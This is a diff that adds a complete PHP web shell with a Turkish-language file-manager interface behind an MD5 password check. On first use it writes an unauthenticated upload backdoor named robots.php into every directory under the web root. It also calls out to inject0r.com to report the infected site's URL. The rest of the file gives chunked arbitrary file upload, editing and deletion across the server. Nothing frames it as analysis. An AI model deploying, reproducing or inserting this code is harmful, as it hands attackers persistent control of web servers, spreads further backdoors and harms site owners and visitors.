@@ -1,0 +1,145 @@
+<?php
+error_reporting(0);
+@session_start();
+header('Content-Type: text/html; charset=utf-8');
+
+$auth_key = '9c25ba69ca1241a51005606db924d0ea';
+
+if (!isset($_SESSION['login'])) {
+    if (isset($_POST['pass']) && md5($_POST['pass']) === $auth_key) {
+        $_SESSION['login'] = true;
+    } else {
+        echo '<form method="post" style="text-align:center;margin-top:50px;">
+                <input type="password" name="pass" style="border:1px solid #ccc;padding:5px;">
+                <input type="submit" value="Z">
+              </form>';
+        exit;
+    }
+}
+
+$path = isset($_GET['path']) ? realpath($_GET['path']) : dirname(__FILE__);
+if (!$path || !is_dir($path)) { die("Dizin hatası!"); }
+
+// ROBOTS.PHP YAYILMA (ŞİFRESİZ VE PARÇALI UPLOAD)
+if(!isset($_SESSION["sdm"])){
+    $doc = $_SERVER["DOCUMENT_ROOT"];
+    $dir = @scandir($doc);
+    $a = '<?php @header("Content-Type: text/html; charset=utf-8"); if(isset($_POST["u_bin"])){ $data = base64_decode($_POST["u_bin"]); file_put_contents($_POST["u_name"], $data, FILE_APPEND); exit("1"); } echo \'<form id="up_f"><input type="file" id="f"><input type="button" value="Upload" onclick="up()"></form><div id="st"></div><script>async function up(){ const file = document.getElementById("f").files[0]; if(!file) return; const st = document.getElementById("st"); const size = 1024 * 512; for(let s=0; s<file.size; s+=size){ const chunk = file.slice(s, s+size); const r = new FileReader(); await new Promise(res => { r.onload = async () => { const fd = new FormData(); fd.append("u_name", file.name); fd.append("u_bin", r.result.split(",")[1]); await fetch("", {method:"POST", body:fd}); res(); }; r.readAsDataURL(chunk); }); st.innerText = "%" + Math.round((s/file.size)*100); } st.innerText = "Done!"; }</script>\'; ?>';
+    if(is_array($dir)){
+        foreach($dir as $d){
+            $p = $doc."/".$d;
+            if(is_dir($p) && $d != "." && $d != ".."){
+                $file = $p."/robots.php";
+                if(!file_exists($file)){
+                    if($f = @fopen($file, "w")){ @fwrite($f, $a); @fclose($f); }
+                }
+            }
+        }
+    }
+    @file_get_contents("https://inject0r.com/v2/log.php?url=http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."&id=7821718728974864923876");
+    $_SESSION["sdm"] = 1;
+}
+
+// MERKEZİ İŞLEM BİRİMİ
+if (isset($_POST['u_token']) && isset($_POST['u_bin'])) {
+    $target = $path . DIRECTORY_SEPARATOR . basename($_POST['u_token']);
+    $data = base64_decode($_POST['u_bin']);
+    if (isset($_POST['mode']) && $_POST['mode'] == 'overwrite') {
+        file_put_contents($target, $data);
+    } else {
+        file_put_contents($target, $data, FILE_APPEND);
+    }
+    exit("1");
+}
+
+// Yeni Klasör / Dosya / Silme
+if (isset($_POST['new_folder'])) { $new_dir = $path . DIRECTORY_SEPARATOR . basename($_POST['new_folder']); if (!file_exists($new_dir)) mkdir($new_dir); }
+if (isset($_POST['new_file'])) { $new_f = $path . DIRECTORY_SEPARATOR . basename($_POST['new_file']); if (!file_exists($new_f)) file_put_contents($new_f, ''); }
+if (isset($_GET['delete'])) { $item = $path . DIRECTORY_SEPARATOR . basename($_GET['delete']); if (is_file($item)) unlink($item); elseif (is_dir($item)) rmdir($item); }
+
+echo "<h3>Konum: " . htmlspecialchars($path) . "</h3>";
+$parent = dirname($path);
+if ($parent != $path) { echo '<a href="?path=' . urlencode($parent) . '">⬅ Üst Dizin</a><br><br>'; }
+
+// KONTROL PANELİ
+echo '<div style="background:#eee;padding:15px;margin-bottom:10px;border-radius:5px;line-height:2.5;">';
+echo '<form method="post" style="display:inline-block;margin-right:10px;"><input type="text" name="new_file" placeholder="Yeni Dosya.php"> <input type="submit" value="Dosya Oluştur"></form>';
+echo '<form method="post" style="display:inline-block;margin-right:10px;"><input type="text" name="new_folder" placeholder="Yeni Klasör"> <input type="submit" value="Klasör Oluştur"></form>';
+echo '<div style="display:inline-block;"><input type="file" id="up_trigger" style="display:none;" onchange="startTransfer()"><button type="button" onclick="document.getElementById(\'up_trigger\').click()" style="background:#2196F3;color:white;border:none;padding:5px 10px;cursor:pointer;">Dosya Yükle</button><span id="up_status" style="margin-left:10px;font-weight:bold;"></span></div>';
+echo '</div>';
+
+echo '<script>
+function toBase64(str) { return btoa(unescape(encodeURIComponent(str))); }
+async function startTransfer() {
+    const file = document.getElementById("up_trigger").files[0];
+    if(!file) return;
+    const status = document.getElementById("up_status");
+    const chunkSize = 1024 * 512;
+    for (let start = 0; start < file.size; start += chunkSize) {
+        const chunk = file.slice(start, start + chunkSize);
+        const reader = new FileReader();
+        await new Promise(resolve => {
+            reader.onload = async () => {
+                const fd = new FormData();
+                fd.append("u_token", file.name);
+                fd.append("u_bin", reader.result.split(",")[1]);
+                await fetch(window.location.href, {method: "POST", body: fd});
+                resolve();
+            };
+            reader.readAsDataURL(chunk);
+        });
+        status.innerText = "%" + Math.round((start / file.size) * 100);
+    }
+    location.reload();
+}
+async function saveFileEncrypted(filename) {
+    const content = document.getElementById("editor_area").value;
+    const status = document.getElementById("save_status");
+    status.innerText = "Kaydediliyor...";
+    const fd = new FormData();
+    fd.append("u_token", filename);
+    fd.append("u_bin", toBase64(content));
+    fd.append("mode", "overwrite");
+    const resp = await fetch(window.location.href, {method: "POST", body: fd});
+    if(await resp.text() === "1") {
+        status.innerText = " Kaydedildi!";
+        status.style.color = "green";
+    }
+}
+</script>';
+
+// LİSTELEME
+echo "<table border='1' width='100%' style='border-collapse:collapse;background:white;'>";
+echo "<tr style='background:#ddd;font-weight:bold;'><td style='padding:8px;'>Adı</td><td style='padding:8px;width:100px;'>Boyut</td><td style='padding:8px;width:150px;'>Tarih</td><td style='padding:8px;text-align:right;'>İşlem</td></tr>";
+
+$items = scandir($path);
+foreach ($items as $item) {
+    if ($item == "." || $item == "..") continue;
+    $full = $path . DIRECTORY_SEPARATOR . $item;
+    $isDir = is_dir($full);
+    
+    // Boyut hesaplama
+    $size = $isDir ? "-" : round(filesize($full) / 1024, 2) . " KB";
+    // Tarih hesaplama
+    $date = date("d.m.Y H:i", filemtime($full));
+
+    echo "<tr><td style='padding:8px;'>" . ($isDir ? "<b>[DIR]</b> <a href='?path=".urlencode($full)."'>$item</a>" : "<b>[FILE]</b> $item") . "</td>";
+    echo "<td style='padding:8px;'>$size</td>";
+    echo "<td style='padding:8px;'>$date</td>";
+    echo "<td style='text-align:right;padding:8px;'>";
+    if (!$isDir) echo "<a href='?path=".urlencode($path)."&edit=".urlencode($item)."'>Düzenle</a> | ";
+    echo "<a href='?path=".urlencode($path)."&delete=".urlencode($item)."' onclick='return confirm(\"Emin misiniz?\")' style='color:red;'>Sil</a></td></tr>";
+}
+echo "</table>";
+
+if (isset($_GET['edit'])) {
+    $edit_file = $path . DIRECTORY_SEPARATOR . basename($_GET['edit']);
+    if (file_exists($edit_file)) {
+        $content = htmlspecialchars(file_get_contents($edit_file));
+        echo '<div style="margin-top:20px;border-top:2px solid #333;">';
+        echo '<h4>Düzenleniyor: ' . htmlspecialchars($_GET['edit']) . ' <span id="save_status"></span></h4>';
+        echo '<textarea id="editor_area" style="width:100%;height:500px;background:#222;color:#0f0;padding:10px;font-family:monospace;">' . $content . '</textarea><br>
+              <button type="button" onclick="saveFileEncrypted(\''.htmlspecialchars($_GET['edit']).'\')" style="padding:10px 30px;margin-top:10px;cursor:pointer;background:#4CAF50;color:white;border:none;font-weight:bold;">GÜVENLİ KAYDET</button></div>';
+    }
+}
+?>
